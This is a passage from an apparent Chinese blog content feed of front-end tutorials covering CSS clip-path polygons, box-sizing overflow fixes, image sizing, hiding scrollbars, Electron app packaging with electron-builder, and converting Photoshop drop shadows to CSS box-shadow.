  <span class="token property">z-index</span><span class="token punctuation">:</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="多边形"><a href="#多边形" class="headerlink" title="多边形"></a>多边形</h2><p>使用clip-path属性的polygon方法，可以更容易地画出三角形，四边形等，任意多边形形状。</p>
<p>polygon( [&lt;fill-rule&gt;,]? [&lt;shape-arg&gt; &lt;shage-arg&gt;]# )</p>
<p>fill-rule决定了多边形内部的填充方式，可选值为nonzero和evenodd，默认为nonzero，后面的每对参数表示多边形以盒模型左上角顶点为原点的顶点坐标 x y。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.polygon</span> <span class="token punctuation">&#123;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
  <span class="token comment">/* 三角形 */</span>
  <span class="token property">clip-path</span><span class="token punctuation">:</span> <span class="token function">polygon</span><span class="token punctuation">(</span>nonzero<span class="token punctuation">,</span> 50% 0<span class="token punctuation">,</span> 0 100%<span class="token punctuation">,</span> 100% 100%<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">/* 平行四边形 */</span>
  <span class="token property">clip-path</span><span class="token punctuation">:</span> <span class="token function">polygon</span><span class="token punctuation">(</span>nonzero<span class="token punctuation">,</span> 50% 0<span class="token punctuation">,</span> 0 100%<span class="token punctuation">,</span> 50% 100%<span class="token punctuation">,</span> 100% 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">/* 梯形 */</span>
  <span class="token property">clip-path</span><span class="token punctuation">:</span> <span class="token function">polygon</span><span class="token punctuation">(</span>nonzero<span class="token punctuation">,</span> 20% 0<span class="token punctuation">,</span> 0 100%<span class="token punctuation">,</span> 100% 100%<span class="token punctuation">,</span> 80% 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>clip-path属性虽然很方便，但是兼容性不好，大家可以根据不同的需求选择不同的方法。</p>
<p>参考连接<br><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/basic-shape">MDN basic shape</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/perspective">MDN perspective</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/transform-function/scale">MDN scale()</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/transform-function/rotateX">MDN rotateX()</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/transform-origin">MDN transform-origin</a><br><a href="https://www.zhangxinxu.com/wordpress/2019/04/css-parallelogram-layout">张鑫旭-CSS实现平行四边形布局效果</a><br><a href="https://blog.csdn.net/kaelyn_X/article/details/78238041">使用CSS写出三角形、圆形、平行四边形、梯形</a><br><a href="https://dabblet.com/gist/1345dc9399dc8e794502">dabblet</a><br><a href="https://segmentfault.com/a/1190000010936207">不可思议的CSS之clip-path</a><br><a href="https://www.zhangxinxu.com/wordpress/2012/09/css3-3d-transform-perspective-animate-transition">张鑫旭-好吧，CSS3 3D transform变换，不过如此！</a></p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>圆形</tag>
        <tag>椭圆形</tag>
        <tag>平行四边形</tag>
        <tag>梯形</tag>
        <tag>多边形</tag>
      </tags>
  </entry>
  <entry>
    <title>css子元素设置width或height为100%再设置margin或padding溢出</title>
    <url>/2018/11/18/css%E5%AD%90%E5%85%83%E7%B4%A0%E8%AE%BE%E7%BD%AEwidth%E6%88%96height%E4%B8%BA%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E5%86%8D%E8%AE%BE%E7%BD%AEmargin%E6%88%96padding%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="子元素width-100-后再设置margin或padding就会溢出父元素"><a href="#子元素width-100-后再设置margin或padding就会溢出父元素" class="headerlink" title="子元素width: 100%后再设置margin或padding就会溢出父元素"></a>子元素width: 100%后再设置margin或padding就会溢出父元素</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
    width: 200px;
    height: 50px;
    background: green;
    <span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
        width: 100%;
        height: 100%;
        background: pink;
        margin: 10px;
        <span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如何解决？</p>
<h2 id="一、父元素设置padding，取消子元素上的margin与padding设置"><a href="#一、父元素设置padding，取消子元素上的margin与padding设置" class="headerlink" title="一、父元素设置padding，取消子元素上的margin与padding设置"></a>一、父元素设置padding，取消子元素上的margin与padding设置</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
    width: 200px;
    height: 50px;
    background: green;
    padding: 10px;
    <span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
        width: 100%;
        height: 100%;
        background: pink;
        <span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="二、box-sizing-border-box"><a href="#二、box-sizing-border-box" class="headerlink" title="二、box-sizing: border-box"></a>二、box-sizing: border-box</h2><p>若子元素只有padding设置而没有margin设置，则可以在子元素上设置 box-sizing: border-box; 这样子元素的宽度100%将包含内容宽度、padding和边框宽度三者。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
    width: 200px;
    height: 50px;
    background: green;
    padding: 10px;
    <span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
        width: 100%;
        height: 100%;
        background: pink;
        padding: 10px;
        box-sizing: border-box;
        <span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>** 知识扩展：box-sizing的两种取值 **</p>
<p>默认取值：content-box，元素占用宽度/高度 = width/height + padding + border + margin</p>
<p>border-box，元素占用宽度/高度 = width/height + margin，padding与border包含在width/height中</p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>width 100% 溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>css让图片适应外层div大小</title>
    <url>/2019/03/24/css%E8%AE%A9%E5%9B%BE%E7%89%87%E9%80%82%E5%BA%94%E5%A4%96%E5%B1%82div%E5%A4%A7%E5%B0%8F/</url>
    <content><![CDATA[<h1 id="让图片适应外层div大小"><a href="#让图片适应外层div大小" class="headerlink" title="让图片适应外层div大小"></a>让图片适应外层div大小</h1><p>在我们展示网络资源图片时通常会遇到在一个固定的宽度内展示不同大小的图片，如果我们让图片撑满100%去适应外层div的大小，那么大于div尺寸的图片将按外层div大小展示，而小于外层div尺寸的图片则会被拉伸至外层div的尺寸，两个尺寸相差悬殊的话，小图会被拉伸地很模糊。</p>
<p>我们通过限定内层图片的最大宽度为外层div的宽度来使大于外层div尺寸的图片适配，而我们不去限定内层图片的宽度以使小于外层div尺寸的图片不被拉伸，直接展示。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>www.test.com/test.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
<span class="token selector">.img-container</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/* 图片不要限定高，否则图片无法按照原有比例展示，会变形 */</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 650px<span class="token punctuation">;</span> <span class="token comment">/* 若是外层还有div且宽度固定，则可以使用100% */</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.img-container img</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/* 图片不要限定高，否则图片无法按照原有比例展示，会变形 */</span>
  <span class="token property">max-width</span><span class="token punctuation">:</span> 650px<span class="token punctuation">;</span> <span class="token comment">/* 也可以使用100% */</span>
<span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>图片</tag>
      </tags>
  </entry>
  <entry>
    <title>css隐藏浏览器滚动条</title>
    <url>/2018/11/18/css%E9%9A%90%E8%97%8F%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BB%9A%E5%8A%A8%E6%9D%A1/</url>
    <content><![CDATA[<h1 id="css隐藏浏览器滚动条"><a href="#css隐藏浏览器滚动条" class="headerlink" title="css隐藏浏览器滚动条"></a>css隐藏浏览器滚动条</h1><h2 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h2><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="IE-Edge"><a href="#IE-Edge" class="headerlink" title="IE/Edge"></a>IE/Edge</h2><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span>
    <span class="token property">-ms-overflow-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>隐藏滚动条</tag>
      </tags>
  </entry>
  <entry>
    <title>electron安装与打包部署windowsApp基础教程</title>
    <url>/2019/06/03/electron%E5%AE%89%E8%A3%85%E4%B8%8E%E6%89%93%E5%8C%85%E9%83%A8%E7%BD%B2windowsApp%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="为-electron-项目新建一个目录，并初始化-npm"><a href="#为-electron-项目新建一个目录，并初始化-npm" class="headerlink" title="为 electron 项目新建一个目录，并初始化 npm"></a>为 electron 项目新建一个目录，并初始化 npm</h2><p>例如新建文件目录为 testDesktopApp，再初始化 npm</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> init
<span class="token comment"># 一路回车即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>修改 package.json 文件，将 name 修改为最终桌面可执行程序的名称，将 main 中的 index.js 修改为 main.js 防止与要打包项目的 js 文件冲突，并在 script 中添加 start 命令。</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"testdesktopapp"</span><span class="token punctuation">,</span>
  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"main.js"</span><span class="token punctuation">,</span>
  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span><span class="token punctuation">,</span>
    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"electron ."</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<h2 id="在项目中安装-electron"><a href="#在项目中安装-electron" class="headerlink" title="在项目中安装 electron"></a>在项目中安装 electron</h2><p>使用–registry 与–ELECTRON_MIRROR 命令从淘宝源安装 electron</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> <span class="token function">install</span> --save-dev electron --registry<span class="token operator">=</span>https://registry.npm.taobao.org --ELECTRON_MIRROR<span class="token operator">=</span>https://npm.taobao.org/mirrors/electron/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>新建 main.js 文件</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> app<span class="token punctuation">,</span> BrowserWindow<span class="token punctuation">,</span> Menu<span class="token punctuation">,</span> Tray <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"electron"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">createWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 不显示菜单栏</span>
  Menu<span class="token punctuation">.</span><span class="token function">setApplicationMenu</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 创建浏览器窗口</span>
  <span class="token keyword">let</span> win <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    width<span class="token operator">:</span> <span class="token number">800</span><span class="token punctuation">,</span>
    height<span class="token operator">:</span> <span class="token number">600</span><span class="token punctuation">,</span>
    webPreferences<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      nodeIntegration<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 加载index.html文件</span>
  win<span class="token punctuation">.</span><span class="token function">loadFile</span><span class="token punctuation">(</span><span class="token string">"./www/index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// // 打开开发者工具</span>
  <span class="token comment">// win.webContents.openDevTools();</span>

  <span class="token comment">// 当 window 被关闭，这个事件会被触发。</span>
  win<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"closed"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 取消引用 window 对象，如果你的应用支持多窗口的话，</span>
    <span class="token comment">// 通常会把多个 window 对象存放在一个数组里面，</span>
    <span class="token comment">// 与此同时，你应该删除相应的元素。</span>
    win <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"ready"</span><span class="token punctuation">,</span> createWindow<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 当全部窗口关闭时退出。</span>
app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"window-all-closed"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 在 macOS 上，除非用户用 Cmd + Q 确定地退出，</span>
  <span class="token comment">// 否则绝大部分应用及其菜单栏会保持激活。</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>platform <span class="token operator">!==</span> <span class="token string">"darwin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    app<span class="token punctuation">.</span><span class="token function">quit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"activate"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 在macOS上，当单击dock图标并且没有其他窗口打开时，</span>
  <span class="token comment">// 通常在应用程序中重新创建一个窗口。</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>win <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">createWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="前端文件的准备"><a href="#前端文件的准备" class="headerlink" title="前端文件的准备"></a>前端文件的准备</h2><ol>
<li>如果是原生的 js 文件，没有使用框架，可以直接放入 electron 项目的 www 目录中，如 testDesktopApp 下的 www 文件夹</li>
<li>如果使用了 vue 框架，则需要修改 router.js 中 mode 为 hash，vue.config.js 中 publicPath 为”./“，再进行打包，将打包后 dist 文件夹中的文件放入 www 文件目录中</li>
</ol>
<h2 id="运行-electron"><a href="#运行-electron" class="headerlink" title="运行 electron"></a>运行 electron</h2><p>执行 npm start 命令，即可运行 electron</p>
<p>打包部署 electron 项目使用第三方打包工具 electron-builder</p>
<h2 id="安装-electron-builder"><a href="#安装-electron-builder" class="headerlink" title="安装 electron-builder"></a>安装 electron-builder</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> <span class="token function">install</span> --save-dev electron-builder --registry<span class="token operator">=</span>https://registry.npm.taobao.org/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="在-package-json-中加入命令"><a href="#在-package-json-中加入命令" class="headerlink" title="在 package.json 中加入命令"></a>在 package.json 中加入命令</h2><p>scripts 中增加 pack 与 dist 命令，pack 命令打包出免安装版文件，dist 命令打包出可执行安装文件，不论是安装版还是免安装版，文件都在 dist 目录下。</p>
<p>新增 build 属性，配置打包出 windows 系统下 x86 和 x64 都兼容的文件。</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"testdesktopapp"</span><span class="token punctuation">,</span>
  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"main.js"</span><span class="token punctuation">,</span>
  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span><span class="token punctuation">,</span>
    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"electron ."</span><span class="token punctuation">,</span>
    <span class="token property">"pack"</span><span class="token operator">:</span> <span class="token string">"electron-builder --dir"</span><span class="token punctuation">,</span>
    <span class="token property">"dist"</span><span class="token operator">:</span> <span class="token string">"electron-builder"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">,</span>
  <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"electron"</span><span class="token operator">:</span> <span class="token string">"^5.0.2"</span><span class="token punctuation">,</span>
    <span class="token property">"electron-builder"</span><span class="token operator">:</span> <span class="token string">"^20.41.0"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"build"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"win"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"target"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
          <span class="token property">"target"</span><span class="token operator">:</span> <span class="token string">"nsis"</span><span class="token punctuation">,</span>
          <span class="token property">"arch"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"x64"</span><span class="token punctuation">,</span> <span class="token string">"ia32"</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="修改应用程序名称与图标"><a href="#修改应用程序名称与图标" class="headerlink" title="修改应用程序名称与图标"></a>修改应用程序名称与图标</h2><p>应用程序名称默认为 package.json 中的 name 属性，进入应用程序后则会读取 www 下 index.html 的 title 标签。</p>
<p>项目图标直接在 electron 项目目录下放置一个名为 icon 的图标文件即可，要求是 ico 格式或 png 格式，最好是 512*512 像素的方形图标。</p>
<h2 id="部署应用程序，生成安装可执行文件"><a href="#部署应用程序，生成安装可执行文件" class="headerlink" title="部署应用程序，生成安装可执行文件"></a>部署应用程序，生成安装可执行文件</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">npm</span> run dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>打包部署完成后会在 electron 项目根目录下生成一个 dist 文件夹，其中 x86 版免安装文件夹为 win-ia32-unpacked，x64 版免安装文件夹为 win-unpacked，安装可执行文件为项目名 + Setup  + 版本号.exe，例如 testdesktopapp Setup 1.0.0.exe。</p>
]]></content>
      <categories>
        <category>electron</category>
      </categories>
      <tags>
        <tag>app</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>css阴影之Photoshop投影与box-shadow转换</title>
    <url>/2020/06/13/css%E9%98%B4%E5%BD%B1%E4%B9%8BPhotoshop%E6%8A%95%E5%BD%B1%E4%B8%8Ebox-shadow%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="box-shadow"><a href="#box-shadow" class="headerlink" title="box-shadow"></a>box-shadow</h2><p>box-shadow属性用于在元素上添加阴影效果。同一个元素上可以设置多个阴影效果，使用逗号将它们分开即可。该属性可设置的值包括x轴偏移量（x-offset），y轴偏移量（y-offset），模糊半径（blur-radius），扩散半径（spread-radius），颜色（color）。</p>
<p>若元素设置了border-radius属性，阴影同样会有圆角效果。多个阴影在z轴上的顺序和text-shadows规则相同，即第一个阴影在最上面。</p>
<h3 id="box-shadow属性值设置规则"><a href="#box-shadow属性值设置规则" class="headerlink" title="box-shadow属性值设置规则"></a>box-shadow属性值设置规则</h3><ul>
<li><p>二至四个值时</p>
<ul>
<li><p>二个值时，被视为offset-x与offset-y</p>
</li>
<li><p>三个值时，第三个值为blur-radius</p>
</li>
<li><p>四个值时，第四个值为spread-radius</p>
</li>
</ul>
</li>
<li><p>inset 可选值，表示阴影向内</p>
</li>
<li><p>color 可选值，指代阴影颜色</p>
</li>
</ul>
<h3 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h3><p>inset 未指定inset时阴影默认向外扩散，使用inset关键字使阴影落在盒子内部，看起来像是内容被压低了，此时阴影在边框之内，背景之上，内容之下。</p>
<p>offset 两个offset为length类型值。用来设置阴影偏移量。offset-x 设置阴影水平偏移，正值阴影位于元素右边，负值阴影位于元素左边。offset-y 设置阴影垂直偏移，正值阴影位于元素下方，负值阴影位于元素上方。</p>
<p>blur-radius 必需为正值，设置阴影模糊面积，越大阴影颜色越淡。默认为0，阴影边缘锐利。</p>
<p>spread-radius 默认为0，阴影与元素同样大小。取正值时，阴影扩大，取负值时，阴影收缩。需要考虑inset属性的影响。</p>
<p>color 未指定时由浏览器决定，通常为color的值，safari中为透明。</p>
<h2 id="Photoshop投影与css阴影的换算"><a href="#Photoshop投影与css阴影的换算" class="headerlink" title="Photoshop投影与css阴影的换算"></a>Photoshop投影与css阴影的换算</h2><p>结构：</p>
<ul>
<li><p>混合模式：Photoshop提供了各种混合模式，css仅支持正常模式</p>
</li>
<li><p>不透明度：相当于box-shadow中color的rgba中的a值</p>
</li>
<li><p>角度：投影的角度</p>
</li>
<li><p>距离：阴影的距离，根据角度和距离可以换算出css3中的offset-x与offset-y</p>
<ul>
<li><p>offset-x：距离 * cos(180度 - 角度)</p>
</li>
<li><p>offset-y：距离 * sin(180度 - 角度)</p>
</li>
</ul>
</li>
<li><p>扩散：阴影的扩散，根据扩散与大小可以计算出spread-radius与blur-radius</p>
</li>
<li><p>大小：阴影的大小</p>
<ul>
<li><p>spread-radius：扩散 * 大小</p>
</li>
<li><p>blur-radius: 大小 - 扩散 * 大小</p>
</li>
</ul>
</li>
</ul>
<p>text-shadow因为没有spread-radius所以不能完全实现Photoshop中的效果。</p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>Photoshop投影</tag>
        <tag>box-shadow</tag>
      </tags>
  </entry>
  <entry>
    <title>gis在leaflet中使用4490坐标系的arcgis瓦片地图</title>
    <url>/2021/06/24/gis%E5%9C%A8leaflet%E4%B8%AD%E4%BD%BF%E7%94%A84490%E5%9D%90%E6%A0%87%E7%B3%BB%E7%9A%84arcgis%E7%93%A6%E7%89%87%E5%9C%B0%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="背景情况"><a href="#背景情况" class="headerlink" title="背景情况"></a>背景情况</h2><p>在对接客户过程中，客户不使用天地图作为地图服务，而要求使用他们发布好的 ArcGIS Server 离线瓦片地图，ArcGIS 离线地图的 z、x、y 规则与 leaflet 地图引擎的默认解析规则不一致，故需要扩展 leaflet 的 TileLayer。</p>
